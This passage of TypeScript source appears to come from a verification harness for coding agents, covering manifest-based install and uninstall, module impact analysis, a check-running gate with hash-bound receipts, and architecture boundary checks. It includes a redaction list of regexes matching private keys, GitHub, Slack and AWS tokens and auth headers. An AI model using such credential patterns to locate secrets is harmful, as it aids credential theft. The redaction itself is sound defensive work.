  ) {
    throw new Error("Refusing to install or upgrade with the harness source as the target.");
  }
  const manifest = sourceManifest();
  const oldPath = safeManagedPath(target, INSTALL_MANIFEST_REL);
  const oldManifest = existsSync(oldPath)
    ? validateInstallManifest(target, readJson(oldPath))
    : null;
  const oldByPath = new Map<string, FileEntry>(
    (oldManifest?.files || []).map((entry: FileEntry) => [entry.path, entry]),
  );
  const operations: InstallOperation[] = [];

  for (const entry of manifest.files) {
    const source = resolve(HARNESS_ROOT, entry.path);
    const destination = safeManagedPath(target, entry.path);
    const currentHash = fileHash(destination);
    const oldHash = oldByPath.get(entry.path)?.sha256;
    if (currentHash === entry.sha256) {
      operations.push({ path: entry.path, action: "unchanged" });
      continue;
    }
    const safeToReplace = currentHash === null || currentHash === oldHash;
    if (safeToReplace) {
      operations.push({ path: entry.path, action: currentHash === null ? "create" : "update" });
      if (!dryRun) copyNormalized(source, destination);
    } else {
      const sidecar = conflictSidecar(target, destination, entry.sha256);
      operations.push({ path: entry.path, action: "preserve", sidecar: posix(relative(target, sidecar)) });
      if (!dryRun) copyNormalized(source, sidecar);
    }
  }

  const sourcePaths = new Set(manifest.files.map((entry: FileEntry) => entry.path));
  if (action === "upgrade" && oldManifest) {
    for (const oldEntry of oldManifest.files || []) {
      if (sourcePaths.has(oldEntry.path)) continue;
      const destination = safeManagedPath(target, oldEntry.path);
      if (fileHash(destination) === oldEntry.sha256) {
        operations.push({ path: oldEntry.path, action: "remove-obsolete" });
        if (!dryRun) rmSync(destination, { force: true });
      } else if (existsSync(destination)) {
        operations.push({ path: oldEntry.path, action: "preserve-obsolete" });
      }
    }
  }

  if (!dryRun) {
    writeJson(oldPath, {
      ...manifest,
      installed_at: new Date().toISOString(),
      source: HARNESS_ROOT,
    });
  }
  printJson({ command: action, target, dry_run: dryRun, operations });
}

function uninstall(options: CliOptions): void {
  const target = targetFrom(options);
  const dryRun = boolOption(options, "dry-run");
  assertSafeTarget(target);
  const manifestPath = safeManagedPath(target, INSTALL_MANIFEST_REL);
  if (!existsSync(manifestPath)) {
    throw new Error(`No install manifest found at ${manifestPath}.`);
  }
  const manifest = readJson(manifestPath);
  validateInstallManifest(target, manifest);
  const operations: InstallOperation[] = [];
  for (const entry of manifest.files || []) {
    const destination = safeManagedPath(target, entry.path);
    if (!existsSync(destination)) continue;
    if (fileHash(destination) === entry.sha256) {
      operations.push({ path: entry.path, action: "remove" });
      if (!dryRun) rmSync(destination, { force: true });
    } else {
      operations.push({ path: entry.path, action: "preserve-modified" });
    }
  }
  if (!dryRun) rmSync(manifestPath, { force: true });
  printJson({ command: "uninstall", target, dry_run: dryRun, operations });
}

function catalog(root: string): ModuleCatalog {
  const local = resolve(root, "harness/module-catalog.json");
  return readJson(existsSync(local) ? local : resolve(HARNESS_ROOT, "harness/default-module-catalog.json"));
}

function matrix(root: string): VerificationMatrix {
  const local = resolve(root, "harness/verification-matrix.json");
  return readJson(
    existsSync(local) ? local : resolve(HARNESS_ROOT, "harness/default-verification-matrix.json"),
  );
}

interface ImpactResult {
  paths: string[];
  classifications: ClassifiedPath[];
  unmatched: string[];
  direct: string[];
  affected: ModuleDefinition[];
  expanded_to_all: boolean;
  expansion_reasons: string[];
}

// Widening costs verification time; missing a dependent costs a silent regression. Every
// condition that makes the mapping untrustworthy therefore fans out to the whole graph.
function affectedModules(root: string, paths: string[], discovered = true): ImpactResult {
  const definition = catalog(root);
  const unique = [...new Set(paths.map(posix))].sort();
  const classifications = unique.map((path) => classifyPath(definition, path));
  const direct = new Set<string>();
  for (const entry of classifications) {
    if (entry.module && (entry.classification === "mapped" || entry.classification === "overlap")) {
      direct.add(entry.module);
    }
  }

  const reasons: string[] = [];
  if (classifications.some((entry) => entry.classification === "global")) {
    reasons.push("a repository-wide path changed");
  }
  if (classifications.some((entry) => entry.classification === "unmapped")) {
    reasons.push("a changed path is not covered by the module catalog");
  }
  if (classifications.some((entry) => entry.classification === "overlap")) {
    reasons.push("a changed path is claimed by more than one module");
  }
  if (definition.modules.some((module) => module.shared && direct.has(module.id))) {
    reasons.push("a shared module changed");
  }
  // Only relevant when Git was the source of the path list. If the caller named the paths,
  // Git's availability says nothing about whether that list is complete.
  if (discovered && unique.length > 0 && !gitAvailable(root)) {
    reasons.push("Git is unavailable, so change discovery cannot be trusted");
  }

  const affected = new Set(direct);
  if (reasons.length > 0) {
    for (const module of definition.modules) affected.add(module.id);
  } else {
    let changed = true;
    while (changed) {
      changed = false;
      for (const module of definition.modules) {
        if (
          !affected.has(module.id) &&
          (module.dependsOn || []).some((dependency: string) => affected.has(dependency))
        ) {
          affected.add(module.id);
          changed = true;
        }
      }
    }
  }
  return {
    paths: unique,
    classifications,
    unmatched: classifications
      .filter((entry) => entry.classification === "unmapped")
      .map((entry) => entry.path),
    direct: [...direct].sort(),
    affected: definition.modules.filter((module: ModuleDefinition) => affected.has(module.id)),
    expanded_to_all: reasons.length > 0,
    expansion_reasons: reasons,
  };
}

interface RequestedPaths {
  paths: string[];
  /** True when the caller named the paths, so Git played no part in discovering them. */
  explicit: boolean;
}

function requestedPaths(root: string, positional: string[], options: CliOptions): RequestedPaths {
  const named = [
    ...positional,
    ...String(options.paths || "")
      .split(",")
      .filter(Boolean),
  ];
  if (named.length > 0) return { paths: named.map(posix), explicit: true };
  return { paths: changedPaths(root, gitBase(root, options.base)), explicit: false };
}

function repoMap(options: CliOptions): void {
  const root = targetFrom(options);
  const definition = catalog(root);
  printJson({
    version: definition.version,
    modules: definition.modules.map((module: ModuleDefinition) => ({
      id: module.id,
      paths: module.paths,
      dependsOn: module.dependsOn || [],
      verification: module.verification || [],
      owners: module.owners || [],
    })),
  });
}

function affected(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const request = requestedPaths(root, positional, options);
  const result = affectedModules(root, request.paths, !request.explicit);
  printJson({
    target: root,
    paths: result.paths,
    classifications: result.classifications,
    direct: result.direct,
    affected: result.affected.map((module: ModuleDefinition) => module.id),
    expanded_to_all: result.expanded_to_all,
    expansion_reasons: result.expansion_reasons,
  });
}

type SelectedCheck = CheckDefinition & { id: string; conservative?: boolean };

interface VerifyPlan extends DiffBinding {
  target: string;
  paths: string[];
  unmatched_paths: string[];
  expanded_to_all: boolean;
  expansion_reasons: string[];
  modules: string[];
  checks: SelectedCheck[];
  plan_sha256: string;
}

function buildVerifyPlan(root: string, positional: string[], options: CliOptions): VerifyPlan {
  const request = requestedPaths(root, positional, options);
  const impact = affectedModules(root, request.paths, !request.explicit);
  const checks = matrix(root).checks || {};
  const selected: SelectedCheck[] = [];
  const seen = new Set<string>();
  for (const module of impact.affected) {
    for (const checkId of module.verification || []) {
      if (seen.has(checkId)) continue;
      if (!checks[checkId]) throw new Error(`Module ${module.id} references unknown check ${checkId}.`);
      seen.add(checkId);
      selected.push({ id: checkId, ...checks[checkId] });
    }
  }
  if (impact.unmatched.length > 0) {
    const conservativeId = checks.validate
      ? "validate"
      : Object.keys(checks).find((id) => checks[id]?.required)
        || Object.keys(checks)[0];
    if (!conservativeId) {
      throw new Error("Unmatched paths require at least one conservative verification check.");
    }
    if (seen.has(conservativeId)) {
      const existing = selected.find((check) => check.id === conservativeId);
      if (existing) existing.conservative = true;
    } else {
      selected.push({ id: conservativeId, ...checks[conservativeId], conservative: true });
    }
  }
  const modules = impact.affected.map((module: ModuleDefinition) => module.id);
  const bound = binding(root, options.base);
  return {
    target: root,
    paths: impact.paths,
    unmatched_paths: impact.unmatched,
    expanded_to_all: impact.expanded_to_all,
    expansion_reasons: impact.expansion_reasons,
    modules,
    checks: selected,
    ...bound,
    // The plan hash lets a receipt prove which selection of checks it came from, so adding a
    // module or a check invalidates evidence gathered under the previous plan.
    plan_sha256: sha256(
      canonicalJson({ modules, checks: selected.map((check) => check.id), ...bound }),
    ),
  };
}

function verifyPlan(positional: string[], options: CliOptions): void {
  printJson(buildVerifyPlan(targetFrom(options), positional, options));
}

const DEFAULT_CHECK_TIMEOUT_MS = 120_000;
const SUMMARY_LIMIT = 2000;
const QUALITY_LEDGER_REL = `${STATE_REL}/quality-ledger.json`;

type CheckStatus = "PASS" | "FAIL" | "BLOCKED" | "SKIPPED";

interface VerificationReceipt {
  version: 1;
  kind: "verification";
  check_id: string;
  class: string;
  required: boolean;
  command: string;
  shell: boolean;
  base_commit: string;
  diff_sha256: string;
  plan_sha256: string;
  modules: string[];
  status: CheckStatus;
  exit_code: number | null;
  duration_ms: number;
  reason: string;
  evidence_path: string | null;
  evidence_sha256: string | null;
  evidence_bytes: number | null;
  summary: string;
  created_at: string;
  content_sha256?: string;
}

const SECRET_PATTERNS: Array<[RegExp, string]> = [
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/g, "[REDACTED PRIVATE KEY]"],
  [/\b(gh[pousr]_)[A-Za-z0-9]{16,}\b/g, "$1[REDACTED]"],
  [/\b(xox[abposr]-)[A-Za-z0-9-]{10,}\b/g, "$1[REDACTED]"],
  [/\b(sk|pk|rk)-[A-Za-z0-9]{16,}\b/g, "[REDACTED]"],
  [/\bAKIA[0-9A-Z]{16}\b/g, "[REDACTED]"],
  // The value can carry an auth scheme, so the credential sits after the scheme keyword.
  [
    /((?:authorization|api[-_]?key|token|password|passwd|secret)["']?\s*[:=]\s*)(?:bearer|basic|token|digest)?\s*\S+/gi,
    "$1[REDACTED]",
  ],
  [/([?&](?:access_token|api_key|token|key)=)[^&\s]+/gi, "$1[REDACTED]"],
];

function redactSecrets(text: string): string {
  let value = text;
  for (const [pattern, replacement] of SECRET_PATTERNS) value = value.replace(pattern, replacement);
  return value;
}

function boundedText(text: string, limit: number): string {
  if (text.length <= limit) return text;
  return `[... ${text.length - limit} characters omitted ...]\n${text.slice(-limit)}`;
}

function whichCommand(name: string): string | null {
  if (name.includes("/") || name.includes("\\")) {
    const direct = resolve(name);
    return existsSync(direct) && statSync(direct).isFile() ? direct : null;
  }
  const separator = process.platform === "win32" ? ";" : ":";
  const extensions =
    process.platform === "win32"
      ? (process.env.PATHEXT || ".COM;.EXE;.BAT;.CMD").split(";").filter(Boolean)
      : [""];
  for (const directory of (process.env.PATH || "").split(separator).filter(Boolean)) {
    for (const extension of extensions) {
      const candidate = resolve(directory, `${name}${extension}`);
      try {
        if (statSync(candidate).isFile()) return candidate;
      } catch {
        continue;
      }
    }
  }
  return null;
}

// A check whose command cannot be found is BLOCKED, never PASS. Reporting a missing tool as
// success is the failure mode that makes every downstream completion claim worthless.
function executeCheck(root: string, check: SelectedCheck, plan: VerifyPlan): VerificationReceipt {
  const command = String(check.command || "").trim();
  const parsed = parseShellCommand(command);
  const useShell = parsed.segments.length !== 1 || parsed.dynamic;
  const receipt: VerificationReceipt = {
    version: 1,
    kind: "verification",
    check_id: check.id,
    class: check.class ?? "unspecified",
    required: check.required !== false,
    command,
    shell: useShell,
    base_commit: plan.base_commit,
    diff_sha256: plan.diff_sha256,
    plan_sha256: plan.plan_sha256,
    modules: plan.modules,
    status: "BLOCKED",
    exit_code: null,
    duration_ms: 0,
    reason: "",
    evidence_path: null,
    evidence_sha256: null,
    evidence_bytes: null,
    summary: "",
    created_at: new Date().toISOString(),
  };

  if (!command) {
    receipt.reason = "No command is configured for this check.";
    return signReceipt(receipt);
  }

  const timeout = Number(check.timeoutMs) > 0 ? Number(check.timeoutMs) : DEFAULT_CHECK_TIMEOUT_MS;
  const started = Date.now();
  let result;
  if (useShell) {
    result = spawnSync(command, {
      cwd: root,
      encoding: "utf8",
      shell: true,
      timeout,
      windowsHide: true,
      maxBuffer: 32 * 1024 * 1024,
    });
  } else {
    const [program, ...args] = parsed.segments[0].tokens;
    if (!whichCommand(program)) {
      receipt.duration_ms = Date.now() - started;
      receipt.reason = `Command not found on PATH: ${program}.`;
      return signReceipt(receipt);
    }
    result = spawnSync(program, args, {
      cwd: root,
      encoding: "utf8",
      timeout,
      windowsHide: true,
      maxBuffer: 32 * 1024 * 1024,
    });
  }
  receipt.duration_ms = Date.now() - started;

  const output = redactSecrets(normalizeLf(`${result.stdout || ""}${result.stderr || ""}`));
  if (output.trim()) {
    const directory = resolve(root, STATE_REL, "evidence");
    mkdirSync(directory, { recursive: true });
    const file = resolve(directory, `${check.id}-${started}-${sha256(output).slice(0, 12)}.log`);
    writeFileSync(file, output, "utf8");
    receipt.evidence_path = posix(relative(root, file));
    receipt.evidence_sha256 = sha256(output);
    receipt.evidence_bytes = Buffer.byteLength(output, "utf8");
  }
  receipt.summary = boundedText(output.trim(), SUMMARY_LIMIT);

  // A timeout arrives as an error, not as a signal, so it has to be recognized before the
  // generic "could not run" branch or the receipt reads as an environment problem.
  const spawnCode = result.error ? (result.error as NodeJS.ErrnoException).code : undefined;
  if (spawnCode === "ETIMEDOUT" || (result.signal && !result.error)) {
    receipt.status = "FAIL";
    receipt.reason = `Command was terminated after ${timeout}ms${result.signal ? ` (signal ${result.signal})` : ""}.`;
    return signReceipt(receipt);
  }
  if (result.error) {
    if (spawnCode === "ENOENT") {
      receipt.reason = `Command not found: ${command}.`;
      return signReceipt(receipt);
    }
    receipt.status = "FAIL";
    receipt.reason = `Command could not run: ${errorMessage(result.error)}.`;
    return signReceipt(receipt);
  }
  receipt.exit_code = result.status ?? null;
  receipt.status = result.status === 0 ? "PASS" : "FAIL";
  receipt.reason = result.status === 0 ? "Command exited 0." : `Command exited ${result.status}.`;
  return signReceipt(receipt);
}

function signReceipt(receipt: VerificationReceipt): VerificationReceipt {
  receipt.content_sha256 = contentHash(receipt as unknown as Record<string, unknown>, "content_sha256");
  return receipt;
}

function readQualityLedger(root: string): VerificationReceipt[] {
  const path = resolve(root, QUALITY_LEDGER_REL);
  if (!existsSync(path)) return [];
  const value = readJson(path);
  return Array.isArray(value?.receipts) ? value.receipts : [];
}

function appendQualityLedger(root: string, receipts: VerificationReceipt[]): void {
  withStateLock(root, "quality-ledger", () => {
    const existing = readQualityLedger(root);
    writeJson(resolve(root, QUALITY_LEDGER_REL), {
      version: 1,
      receipts: [...existing, ...receipts].slice(-500),
    });
  });
}

interface AttributeCoverage {
  module: string;
  attribute: QualityAttribute;
  tier: AttributeTier;
  enforcement: AttributeEnforcement;
  covered: boolean;
  /** Checks in the plan that claim this attribute, and whether each currently passes. */
  evidence: Array<{ check: string; status: CheckStatus | "MISSING" }>;
  reason: string;
  /** Why this module opted out, recorded so the decision stays reviewable. */
  justification?: string;
}

interface QualityAssessment {
  complete: boolean;
  base_commit: string;
  diff_sha256: string;
  checks: Array<{
    id: string;
    required: boolean;
    acceptable: boolean;
    status: CheckStatus | "MISSING";
    /** What the evidence is tied to: the exact diff, or a time window for runtime results. */
    binding: string;
    reason: string;
  }>;
  attributes: AttributeCoverage[];
}

// Completion is decided by receipts bound to the current diff. A structural check that never
// executed the project's own verification can never satisfy this.
function assessQuality(root: string, plan: VerifyPlan): QualityAssessment {
  const ledger = readQualityLedger(root);
  const validityHours = Number(catalog(root).runtimeValidityHours) > 0
    ? Number(catalog(root).runtimeValidityHours)
    : 24;
  const checks = plan.checks.map((check) => {
    const required = check.required !== false;
    // A load test or an SLO probe measures a deployed system, so no diff hash can describe it.
    // Such results are accepted inside a time window and labelled so they are never mistaken
    // for evidence about the code currently in the working tree.
    const timeBound = check.class === "runtime";
    const matching = ledger.filter((receipt) =>
      receipt.check_id === check.id &&
      (timeBound
        ? Date.now() - Date.parse(receipt.created_at) <= validityHours * 3600_000
        : receipt.diff_sha256 === plan.diff_sha256),
    );
    const latest = matching[matching.length - 1];
    const binding = timeBound ? (`time-window-${validityHours}h` as const) : ("diff" as const);
    if (!latest) {
      return {
        id: check.id,
        required,
        acceptable: !required,
        status: "MISSING" as const,
        binding,
        reason: timeBound
          ? `No runtime result recorded in the last ${validityHours} hours.`
          : "No verification receipt exists for the current diff.",
      };
    }
    return {
      id: check.id,
      required,
      // A check that ran and failed is never acceptable, whether or not it was required.
      // Treating an optional failure as acceptable made `gate` and `quality status` disagree
      // about the same evidence.
      acceptable: latest.status === "PASS" || (!required && latest.status === "SKIPPED"),
      status: latest.status,
      binding,
      reason: timeBound ? `${latest.reason} Recorded at ${latest.created_at}; not bound to the current diff.` : latest.reason,
    };
  });
  const definition = catalog(root);
  const statusOf = new Map(checks.map((check) => [check.id, check.status]));
  const attributes: AttributeCoverage[] = [];
  for (const moduleId of plan.modules) {
    const module = definition.modules.find((entry) => entry.id === moduleId);
    for (const [attribute, requirement] of Object.entries(module?.attributes || {})) {
      const { tier, reason: justification } = normalizeRequirement(requirement);
      const enforcement = TIER_ENFORCEMENT[tier] ?? "warn";
      if (tier === "none") {
        attributes.push({
          module: moduleId,
          attribute: attribute as QualityAttribute,
          tier,
          enforcement,
          covered: true,
          evidence: [],
          reason: "Explicitly not enforced for this module.",
          justification,
        });
        continue;
      }
      // Evidence must come from a check the module itself selected. A security scan that ran
      // for a different module says nothing about this one.
      const claiming = (module?.verification || []).filter((checkId) =>
        (plan.checks.find((check) => check.id === checkId)?.attributes || []).includes(
          attribute as QualityAttribute,
        ),
      );
      const evidence = claiming.map((checkId) => ({
        check: checkId,
        status: statusOf.get(checkId) ?? ("MISSING" as const),
      }));
      const passing = evidence.filter((entry) => entry.status === "PASS");
      // A failing claim outweighs a passing one. One check saying the attribute holds does not
      // survive another check demonstrating that it does not.
      const contradicting = evidence.filter(
        (entry) => entry.status === "FAIL" || entry.status === "BLOCKED",
      );
      attributes.push({
        module: moduleId,
        attribute: attribute as QualityAttribute,
        tier,
        enforcement,
        covered: passing.length > 0 && contradicting.length === 0,
        evidence,
        reason:
          contradicting.length > 0
            ? `Contradicted by ${contradicting.map((entry) => `${entry.check} (${entry.status})`).join(", ")}.`
            : passing.length > 0
              ? `Evidenced by ${passing.map((entry) => entry.check).join(", ")}.`
              : claiming.length === 0
                ? `No check in this module's verification list claims the ${attribute} attribute.`
                : `Checks claiming ${attribute} have not passed for the current diff.`,
      });
    }
  }

  // Only the two strongest tiers close the gate. The rest stay visible without forcing a
  // prototype to meet the same bar as a payments module.
  const blockingGaps = attributes.filter(
    (entry) => entry.enforcement === "block" && !entry.covered,
  );

  return {
    complete: checks.every((check) => check.acceptable) && blockingGaps.length === 0,
    base_commit: plan.base_commit,
    diff_sha256: plan.diff_sha256,
    checks,
    attributes,
  };
}

function gate(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const plan = buildVerifyPlan(root, [], options);
  const filter = new Set(positional);
  const wanted = filter.size ? plan.checks.filter((check) => filter.has(check.id)) : plan.checks;
  for (const id of filter) {
    if (!plan.checks.some((check) => check.id === id)) {
      throw new Error(`Check ${id} is not part of the verification plan for these changes.`);
    }
  }

  // `--dry-run` means nothing runs. Executing attacker-supplied matrix commands while the
  // operator believes they are previewing is the worst possible reading of the flag.
  if (boolOption(options, "dry-run")) {
    printJson({
      command: "gate",
      target: root,
      dry_run: true,
      base_commit: plan.base_commit,
      diff_sha256: plan.diff_sha256,
      modules: plan.modules,
      would_execute: wanted.map((check) => ({
        id: check.id,
        class: check.class ?? "unspecified",
        attributes: check.attributes ?? [],
        command: check.command ?? "",
        executable_available:
          parseShellCommand(String(check.command || "")).segments.length === 1
            ? whichCommand(parseShellCommand(String(check.command || "")).segments[0].tokens[0]) !== null
            : null,
      })),
    });
    return;
  }

  if (wanted.length === 0) {
    // A plan that selected nothing has verified nothing. Reporting PASS here would make an
    // over-broad ignore rule or a failed discovery look like success.
    printJson({
      command: "gate",
      target: root,
      base_commit: plan.base_commit,
      diff_sha256: plan.diff_sha256,
      modules: plan.modules,
      status: "BLOCKED",
      reason:
        "The verification plan selected no checks. Either nothing changed, or the catalog excludes the changed paths.",
      results: [],
    });
    process.exitCode = 2;
    return;
  }

  const receipts = wanted.map((check) => executeCheck(root, check, plan));
  appendQualityLedger(root, receipts);

  const status: CheckStatus = receipts.some((receipt) => receipt.status === "FAIL")
    ? "FAIL"
    : receipts.some((receipt) => receipt.status === "BLOCKED")
      ? "BLOCKED"
      : "PASS";

  printJson({
    command: "gate",
    target: root,
    base_commit: plan.base_commit,
    diff_sha256: plan.diff_sha256,
    plan_sha256: plan.plan_sha256,
    modules: plan.modules,
    status,
    // Passing checks stay quiet so a green run cannot flood the agent's context with output
    // that pushes the actual task out of view.
    results: receipts.map((receipt) => ({
      id: receipt.check_id,
      status: receipt.status,
      exit_code: receipt.exit_code,
      duration_ms: receipt.duration_ms,
      evidence_path: receipt.evidence_path,
      ...(receipt.status === "PASS" ? {} : { reason: receipt.reason, summary: receipt.summary }),
    })),
  });
  if (status !== "PASS") process.exitCode = 2;
}

const SOURCE_EXTENSIONS = new Set([
  ".js", ".mjs", ".cjs", ".jsx", ".ts", ".mts", ".cts", ".tsx",
  ".py", ".go", ".java", ".kt", ".kts", ".cs", ".rs", ".rb", ".php", ".swift", ".scala",
]);

const JS_EXTENSIONS = [".ts", ".tsx", ".mts", ".cts", ".js", ".jsx", ".mjs", ".cjs"];

const IMPORT_PATTERNS: Array<{ extensions: RegExp; patterns: RegExp[] }> = [
  {
    extensions: /\.(m|c)?(j|t)sx?$/,
    patterns: [
      /\bimport\s+(?:[\w*{}\n\r\t, ]+\s+from\s+)?["']([^"']+)["']/g,
      /\bexport\s+(?:[\w*{}\n\r\t, ]+\s+)?from\s+["']([^"']+)["']/g,
      /\brequire\s*\(\s*["']([^"']+)["']\s*\)/g,
      /\bimport\s*\(\s*["']([^"']+)["']\s*\)/g,
    ],
  },
  {
    extensions: /\.py$/,
    patterns: [
      /^[ \t]*from[ \t]+([.\w]+)[ \t]+import\b/gm,
      /^[ \t]*import[ \t]+([.\w]+)/gm,
    ],
  },
  { extensions: /\.go$/, patterns: [/^[ \t]*(?:[\w.]+[ \t]+)?"([^"]+)"/gm] },
  { extensions: /\.(java|kt|kts|scala)$/, patterns: [/^[ \t]*import[ \t]+(?:static[ \t]+)?([\w.]+)/gm] },
  { extensions: /\.cs$/, patterns: [/^[ \t]*using[ \t]+(?:static[ \t]+)?([\w.]+)[ \t]*;/gm] },
  { extensions: /\.rs$/, patterns: [/^[ \t]*use[ \t]+([\w:]+)/gm] },
  { extensions: /\.rb$/, patterns: [/\brequire(?:_relative)?\s+["']([^"']+)["']/g] },
  { extensions: /\.php$/, patterns: [/^[ \t]*use[ \t]+([\w\\]+)/gm] },
  { extensions: /\.swift$/, patterns: [/^[ \t]*import[ \t]+([\w.]+)/gm] },
];

function extractImports(file: string, contents: string): string[] {
  const found = new Set<string>();
  for (const group of IMPORT_PATTERNS) {
    if (!group.extensions.test(file)) continue;
    for (const pattern of group.patterns) {
      pattern.lastIndex = 0;
      let match = pattern.exec(contents);
      while (match) {
        if (match[1]) found.add(match[1]);
        match = pattern.exec(contents);
      }
    }
  }
  return [...found];
}

function moduleForPath(definition: ModuleCatalog, path: string): ModuleDefinition | null {
  let best: ModuleDefinition | null = null;
  let bestScore = -1;
  for (const module of definition.modules) {
    for (const pattern of moduleEffectivePaths(module)) {
      if (!matchesPath(path, [pattern])) continue;
      // The most specific declaration wins so a broad module cannot silently swallow a nested one.
      const score = pattern.replace(/[*?]/g, "").length;
      if (score > bestScore) {
        best = module;
        bestScore = score;
      }
    }
  }
  return best;
}

function resolveRelativeImport(root: string, fromFile: string, specifier: string): string | null {
  const base = resolve(dirname(resolve(root, fromFile)), specifier);
  const candidates = [base, ...JS_EXTENSIONS.map((extension) => `${base}${extension}`)];
  // TypeScript under NodeNext writes the emitted extension in the specifier, so `./x.js`
  // is how a file named `x.ts` is imported. Without this the whole graph reads as unresolved.
  const rewritten = base.replace(/\.(js|mjs|cjs|jsx)$/, "");
  if (rewritten !== base) {
    for (const extension of JS_EXTENSIONS) candidates.push(`${rewritten}${extension}`);
  }
  for (const extension of JS_EXTENSIONS) candidates.push(resolve(base, `index${extension}`));
  candidates.push(`${base}.py`, resolve(base, "__init__.py"));
  for (const candidate of candidates) {
    if (existsSync(candidate) && statSync(candidate).isFile() && isWithin(root, candidate)) {
      return posix(relative(root, candidate));
    }
  }
  return null;
}

function moduleForSpecifier(definition: ModuleCatalog, specifier: string): ModuleDefinition | null {
  let best: ModuleDefinition | null = null;
  let bestLength = -1;
  for (const module of definition.modules) {
    for (const provided of module.provides || []) {
      if (specifier !== provided && !specifier.startsWith(`${provided}/`) && !specifier.startsWith(`${provided}.`)) {
        continue;
      }
      if (provided.length > bestLength) {
        best = module;
        bestLength = provided.length;
      }
    }
  }
  return best;
}

function detectCycles(edges: Map<string, Set<string>>): string[][] {
  const cycles: string[][] = [];
  const state = new Map<string, number>();
  const stack: string[] = [];
  const visit = (node: string): void => {
    state.set(node, 1);
    stack.push(node);
    for (const next of edges.get(node) || []) {
      if (state.get(next) === 1) {
        const start = stack.indexOf(next);
        if (start !== -1) cycles.push([...stack.slice(start), next]);
      } else if (!state.has(next)) {
        visit(next);
      }
    }
    stack.pop();
    state.set(node, 2);
  };
  for (const node of edges.keys()) if (!state.has(node)) visit(node);
  return cycles;
}

interface ArchViolation {
  from: string;
  to: string;
  evidence: string[];
  rule?: string;
}

// A layer may depend on itself or on anything further inward. Reaching outward inverts the
// architecture, which is the failure that boundary documents never catch on their own.
function layerViolation(
  definition: ModuleCatalog,
  from: ModuleDefinition,
  to: ModuleDefinition,
): string | null {
  const order = definition.layers || [];
  if (order.length === 0 || !from.layer || !to.layer) return null;
  const fromIndex = order.indexOf(from.layer);
  const toIndex = order.indexOf(to.layer);
  if (fromIndex === -1 || toIndex === -1 || toIndex >= fromIndex) return null;
  return `layer ${from.layer} may not depend on the outer layer ${to.layer}`;
}

// The module graph is only a guardrail if the declaration is checked against what the code
// actually imports. A stale `dependsOn` under-reports impact, which loses tests silently.
function archCheck(options: CliOptions): void {
  const root = targetFrom(options);
  const definition = catalog(root);
  const maxFiles = Number(options["max-files"]) > 0 ? Number(options["max-files"]) : 20_000;
  const declared = new Map<string, Set<string>>(
    definition.modules.map((module) => [module.id, new Set(module.dependsOn || [])]),
  );
  const actual = new Map<string, Set<string>>(definition.modules.map((module) => [module.id, new Set<string>()]));
  const violations = new Map<string, ArchViolation>();
  const forbidden = new Map<string, ArchViolation>();

  let scanned = 0;
  let unresolved = 0;
  let truncated = false;
  for (const absolute of walkFiles(root)) {
    if (scanned >= maxFiles) {
      truncated = true;
      break;
    }
    const rel = posix(relative(root, absolute));
    const extension = rel.slice(rel.lastIndexOf("."));
    if (!SOURCE_EXTENSIONS.has(extension)) continue;
    const owner = moduleForPath(definition, rel);
    if (!owner) continue;
    scanned += 1;
    let contents: string;
    try {
      contents = readFileSync(absolute, "utf8");
    } catch {
      continue;
    }
    for (const specifier of extractImports(rel, contents)) {
      let target: ModuleDefinition | null = null;
      if (specifier.startsWith(".")) {
        const resolved = resolveRelativeImport(root, rel, specifier);
        target = resolved ? moduleForPath(definition, resolved) : null;
        if (!resolved) unresolved += 1;
      } else {
        target = moduleForSpecifier(definition, specifier);
        if (!target) unresolved += 1;
      }
      if (!target || target.id === owner.id) continue;
      actual.get(owner.id)?.add(target.id);
      const key = `${owner.id}->${target.id}`;
      const site = `${rel}: ${specifier}`;

      // A forbidden edge outranks a declared one: declaring a dependency the catalog also
      // forbids is a contradiction, and the prohibition is the stronger statement.
      const forbiddenRule = (owner.forbiddenDependencies || []).includes(target.id)
        ? `${owner.id} forbids depending on ${target.id}`
        : layerViolation(definition, owner, target);
      if (forbiddenRule) {
        const existing = forbidden.get(key) ?? {
          from: owner.id,
          to: target.id,
          evidence: [],
          rule: forbiddenRule,
        };
        if (existing.evidence.length < 5) existing.evidence.push(site);
        forbidden.set(key, existing);
        continue;
      }
      if (declared.get(owner.id)?.has(target.id)) continue;
      const existing = violations.get(key) ?? { from: owner.id, to: target.id, evidence: [] };
      if (existing.evidence.length < 5) existing.evidence.push(site);
      violations.set(key, existing);
    }
  }

  const unusedDeclarations: Array<{ from: string; to: string }> = [];
  for (const [id, targets] of declared) {
    for (const target of targets) {
      if (!actual.get(id)?.has(target)) unusedDeclarations.push({ from: id, to: target });
    }
  }
  const cycles = detectCycles(actual);
  const ok = violations.size === 0 && forbidden.size === 0 && cycles.length === 0;

  printJson({
    command: "arch-check",
    target: root,
    ok,
    scanned_files: scanned,
    truncated,
    unresolved_imports: unresolved,
    edges: [...actual].map(([id, targets]) => ({ module: id, dependsOn: [...targets].sort() })),
    // Kept separate from undeclared edges: one means the map is out of date, the other means a
    // boundary the repository deliberately drew has been crossed.
    forbidden_dependencies: [...forbidden.values()].sort((left, right) =>
      `${left.from}->${left.to}`.localeCompare(`${right.from}->${right.to}`),
    ),
    undeclared_dependencies: [...violations.values()].sort((left, right) =>
      `${left.from}->${left.to}`.localeCompare(`${right.from}->${right.to}`),
    ),
    // A declaration with no matching import over-reports impact: safe for testing, but it hides
    // that the boundary is no longer real, so it is reported without failing the check.
    unused_declarations: unusedDeclarations.sort((left, right) =>
      `${left.from}->${left.to}`.localeCompare(`${right.from}->${right.to}`),
    ),
    cycles,
  });
  if (!ok) process.exitCode = 1;
}

const CONTEXT_DENIED_DIRECTORIES = [
  ".git",
  "node_modules",
  "vendor",
  "third_party",
  "dist",
  "build",
  "out",
  "coverage",
  ".cache",
  ".venv",
  ".next",
  ".cursor/harness-state",
];

const DEFAULT_CONTEXT_BUDGET: Required<ContextBudget> = {
  totalChars: 120_000,
  fileChars: 20_000,
  diffChars: 40_000,
  maxFiles: 40,
};

interface PackEntry {
  path: string;
  priority: number;
  chars: number;
  sha256: string;
  contents: string;
  truncated: boolean;
}

function contextDenied(path: string): boolean {
  const candidate = posix(path);
  if (sensitivePath(candidate)) return true;
  return CONTEXT_DENIED_DIRECTORIES.some(
    (directory) => candidate === directory || candidate.startsWith(`${directory}/`),
  );
}

function readForContext(root: string, rel: string, limit: number): PackEntry | null {
  const absolute = resolve(root, rel);
